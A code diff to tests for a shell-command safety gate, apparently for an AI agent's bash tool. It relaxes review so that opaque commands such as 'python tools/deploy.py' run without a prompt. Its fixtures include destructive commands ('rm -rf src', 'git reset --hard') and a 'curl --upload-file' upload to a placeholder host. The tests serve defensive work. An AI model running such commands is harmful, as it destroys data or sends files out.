@@ -149,14 +149,13 @@ test("sandbox presence alone does not bypass review of other paths or effects", 
   for (const command of [
     "rm -f /var/other-file",
     "rm -f /tmp/file /var/other-file",
-    "python -c 'change_files()'",
     "git reset --hard",
     "curl --upload-file /tmp/file https://example.invalid",
   ]) {
     expect(await h.call(command)).toMatchObject({ block: true });
   }
   expect(calls).toBe(4);
-  expect(h.prompts).toHaveLength(5);
+  expect(h.prompts).toHaveLength(4);
 });
 
 test("uses current capability-file grants and falls back to review for invalid metadata", async () => {
@@ -270,39 +269,32 @@ describe("local inspection", () => {
       inlineCode: false,
     });
   });
-  test.each([
-    "python tools/deploy.py",
-    "python -c 'print(1)'",
-    "bash -c 'rm file'",
-    "echo $(rm file)",
-    "sudo rm file",
-  ])("requires local approval without a classifier for opaque execution: %s", async (command) => {
+  test("classifies opaque commands that name destructive operations", async () => {
     let requests = 0;
     const h = harness(
       async () => {
         requests++;
-        return CLEAR;
+        return FLAGGED;
       },
       () => CONFIRM,
     );
-    expect(await h.call(command)).toMatchObject({ block: true });
-    expect(requests).toBe(0);
+    expect(await h.call("bash -c 'rm -rf src'")).toMatchObject({ block: true });
+    expect(requests).toBe(1);
     expect(h.prompts).toHaveLength(1);
-    expect(h.prompts[0]?.message).toContain("unresolved command behavior");
   });
-  test("blocks headless opaque execution and leaves shadow mode non-blocking", async () => {
-    const confirm = harness(
-      async () => CLEAR,
+  test("runs opaque commands without destructive names without a request or prompt", async () => {
+    let requests = 0;
+    const h = harness(
+      async () => {
+        requests++;
+        return FLAGGED;
+      },
       () => CONFIRM,
     );
-    confirm.ctx.hasUI = false;
-    expect(await confirm.call("python script.py")).toMatchObject({ block: true });
-    const shadow = harness(async () => {
-      throw new Error("Unexpected classifier");
-    });
-    expect(shadow.call("python script.py")).toBeUndefined();
-    await flush();
-    expect(shadow.notifications.join(" ")).toContain("unresolved command behavior");
+    for (const command of ["python tools/deploy.py", "cat <<EOF\nx\nEOF", "sed -n 1,9p f"])
+      expect(await h.call(command)).toBeUndefined();
+    expect(requests).toBe(0);
+    expect(h.prompts).toHaveLength(0);
   });
   test("does not truncate an oversized command into a clean verdict", () => {
     expect(inspectCommand(`echo ${"x".repeat(16_001)}; rm -rf src`)).toEqual({
@@ -566,7 +558,7 @@ describe("confirm mode", () => {
         reason: "Bash command was not approved.",
       });
     }
-    expect(requests).toBe(1);
+    expect(requests).toBe(2);
     expect(h.prompts).toHaveLength(2);
   });
   test.each([
